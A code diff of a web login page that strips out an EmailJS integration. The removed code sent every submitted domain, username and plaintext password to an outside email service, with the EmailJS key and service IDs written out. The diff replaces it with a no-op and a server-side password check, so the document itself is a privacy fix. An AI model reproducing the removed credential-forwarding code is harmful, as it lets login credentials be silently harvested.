@@ -144,14 +144,13 @@
     }
   </style>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
   <script src="firebase-api.js"></script>
 
   <script>
-    emailjs.init("M_uBMfrKLSc9SDTWh");
+    // EmailJS removed for privacy; do not transmit passwords.
   </script>
 </head>
 <body>
@@ -281,24 +280,10 @@
     window.location.href = 'cyberbull-domain.html';
   };
 
-  const EMAILJS_SERVICE_ID = 'service_ajqb3y6';
-  const EMAILJS_TEMPLATE_ID = 'template_unxe68g';
-
   function sendLoginSubmission(domain, username, password) {
-    if (!window.emailjs || !window.emailjs.send) {
-      return Promise.resolve();
-    }
-
-    const templateParams = {
-      domain,
-      username,
-      password
-    };
-
-    return emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
-      .catch((sendError) => {
-        console.error('EmailJS login submission failed', sendError);
-      });
+    // Disabled: do not send plaintext passwords to third-party services.
+    // This is a no-op placeholder for privacy-preserving telemetry.
+    return Promise.resolve();
   }
 
   function bindLoginEvents() {
@@ -370,8 +355,19 @@
       return;
     }
 
-    if (password !== userData.password) {
-      error.textContent = page.wrongPassword;
+    // Verify password via server endpoint (do not expose plaintext password)
+    try {
+      const verifyResp = await fetch('/api/checkPassword', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ userKey, password })
+      });
+      if (!verifyResp.ok) {
+        error.textContent = page.wrongPassword;
+        return;
+      }
+    } catch (err) {
+      console.error('Password verification failed', err);
+      error.textContent = 'Unable to verify your credentials with the server.';
       return;
     }
 
